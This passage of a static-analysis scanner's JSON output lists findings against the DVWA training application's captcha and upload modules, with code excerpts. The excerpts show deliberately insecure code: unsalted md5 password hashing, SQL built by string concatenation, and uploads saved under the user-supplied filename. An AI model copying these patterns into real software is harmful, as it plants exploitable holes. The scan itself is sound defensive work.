        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\t// CAPTCHA was correct. Do both new passwords match?\n\t\tif ($pass_new == $pass_conf) {\n\t\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 27,
        "startLocationColumn": 16,
        "endLocationLine": 27,
        "endLocationColumn": 19
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39; ],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n\t);\n\n\t// Did the CAPTCHA fail?\n\tif( !$resp ) {\n",
        "startLocationLine": 28,
        "startLocationColumn": 22,
        "endLocationLine": 28,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );",
        "excerpt": "\t}\n\telse {\n\t\t// Check that the current password is correct\n\t\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Do both new password match and was the current password correct?\n",
        "startLocationLine": 41,
        "startLocationColumn": 25,
        "endLocationLine": 41,
        "endLocationColumn": 114
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );",
        "excerpt": "\t\t// Do both new password match and was the current password correct?\n\t\tif( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t\t// Update the database\n\t\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t\t$data-&gt;execute();\n\n\t\t\t// Feedback for the end user - success!\n",
        "startLocationLine": 49,
        "startLocationColumn": 26,
        "endLocationLine": 49,
        "endLocationColumn": 93
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass_new  = $_POST[ &#39;password_new&#39; ];\n\t$pass_new  = stripslashes( $pass_new );\n\t$pass_new  = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_new  = md5( $pass_new );\n\n\t$pass_conf = $_POST[ &#39;password_conf&#39; ];\n\t$pass_conf = stripslashes( $pass_conf );\n\t$pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_conf = md5( $pass_conf );\n",
        "startLocationLine": 14,
        "startLocationColumn": 15,
        "endLocationLine": 14,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass_conf = $_POST[ &#39;password_conf&#39; ];\n\t$pass_conf = stripslashes( $pass_conf );\n\t$pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_conf = md5( $pass_conf );\n\n\t$pass_curr = $_POST[ &#39;password_current&#39; ];\n\t$pass_curr = stripslashes( $pass_curr );\n\t$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_curr = md5( $pass_curr );\n",
        "startLocationLine": 19,
        "startLocationColumn": 15,
        "endLocationLine": 19,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass_curr = $_POST[ &#39;password_current&#39; ];\n\t$pass_curr = stripslashes( $pass_curr );\n\t$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_curr = md5( $pass_curr );\n\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39; ],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n",
        "startLocationLine": 24,
        "startLocationColumn": 15,
        "endLocationLine": 24,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39; ],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n\t);\n\n\t// Did the CAPTCHA fail?\n\tif( !$resp ) {\n",
        "startLocationLine": 13,
        "startLocationColumn": 22,
        "endLocationLine": 13,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 68,
        "startLocationColumn": 13,
        "endLocationLine": 68,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( $pass_new == $pass_conf ) {\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 65,
        "startLocationColumn": 15,
        "endLocationLine": 65,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39;],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n\t);\n\n\t// Did the CAPTCHA fail?\n\tif( !$resp ) {\n",
        "startLocationLine": 13,
        "startLocationColumn": 22,
        "endLocationLine": 13,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 60,
        "startLocationColumn": 13,
        "endLocationLine": 60,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( $pass_new == $pass_conf ) {\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 57,
        "startLocationColumn": 15,
        "endLocationLine": 57,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/high.php",
        "ruleId": "DH000001",
        "ruleName": "Functions: Web upload functions",
        "ruleDescription": "Function: Web upload functions",
        "pattern": "\\b(move_uploaded_file)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Important",
        "tags": [
          "Functions.upload"
        ],
        "sample": "move_uploaded_file",
        "excerpt": "\t\tgetimagesize( $uploaded_tmp ) ) {\n\n\t\t// Can we move the file to the upload folder?\n\t\tif( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {\n\t\t\t// No\n\t\t\t$html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;\n\t\t}\n\t\telse {\n\t\t\t// Yes!\n",
        "startLocationLine": 20,
        "startLocationColumn": 8,
        "endLocationLine": 20,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/high.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\nif( isset( $_POST[ &#39;Upload&#39; ] ) ) {\n\t// Where are we going to be writing to?\n\t$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;\n\t$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n\t// File information\n\t$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];\n\t$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);\n",
        "startLocationLine": 5,
        "startLocationColumn": 43,
        "endLocationLine": 5,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t// Where are we going to be writing to?\n\t$target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;;\n\t//$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;\n\t$target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\t$temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );\n\t$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\n\t// Is it an image?\n\tif( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp;\n",
        "startLocationLine": 18,
        "startLocationColumn": 20,
        "endLocationLine": 18,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t//$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;\n\t$target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\t$temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );\n\t$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\n\t// Is it an image?\n\tif( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp;\n\t\t( $uploaded_size &lt; 100000 ) &amp;&amp;\n\t\t( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp;\n",
        "startLocationLine": 20,
        "startLocationColumn": 41,
        "endLocationLine": 20,
        "endLocationColumn": 44
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/impossible.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\t$uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];\n\n\t// Where are we going to be writing to?\n\t$target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;;\n\t//$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;\n\t$target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\t$temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );\n\t$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\n",
        "startLocationLine": 16,
        "startLocationColumn": 44,
        "endLocationLine": 16,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/medium.php",
        "ruleId": "DH000001",
        "ruleName": "Functions: Web upload functions",
        "ruleDescription": "Function: Web upload functions",
        "pattern": "\\b(move_uploaded_file)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Important",
        "tags": [
          "Functions.upload"
        ],
        "sample": "move_uploaded_file",
        "excerpt": "\t\t( $uploaded_size &lt; 100000 ) ) {\n\n\t\t// Can we move the file to the upload folder?\n\t\tif( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {\n\t\t\t// No\n\t\t\t$html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;\n\t\t}\n\t\telse {\n\t\t\t// Yes!\n",
        "startLocationLine": 18,
        "startLocationColumn": 8,
        "endLocationLine": 18,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/medium.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\nif( isset( $_POST[ &#39;Upload&#39; ] ) ) {\n\t// Where are we going to be writing to?\n\t$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;\n\t$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n\t// File information\n\t$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];\n\t$uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];\n",
        "startLocationLine": 5,
        "startLocationColumn": 43,
        "endLocationLine": 5,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/low.php",
        "ruleId": "DH000001",
        "ruleName": "Functions: Web upload functions",
        "ruleDescription": "Function: Web upload functions",
        "pattern": "\\b(move_uploaded_file)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Important",
        "tags": [
          "Functions.upload"
        ],
        "sample": "move_uploaded_file",
        "excerpt": "\t$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n\t// Can we move the file to the upload folder?\n\tif( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {\n\t\t// No\n\t\t$html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;\n\t}\n\telse {\n\t\t// Yes!\n",
        "startLocationLine": 9,
        "startLocationColumn": 7,
        "endLocationLine": 9,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/low.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\nif( isset( $_POST[ &#39;Upload&#39; ] ) ) {\n\t// Where are we going to be writing to?\n\t$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;\n\t$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n\t// Can we move the file to the upload folder?\n\tif( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {\n\t\t// No\n",
        "startLocationLine": 5,
        "startLocationColumn": 43,
        "endLocationLine": 5,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
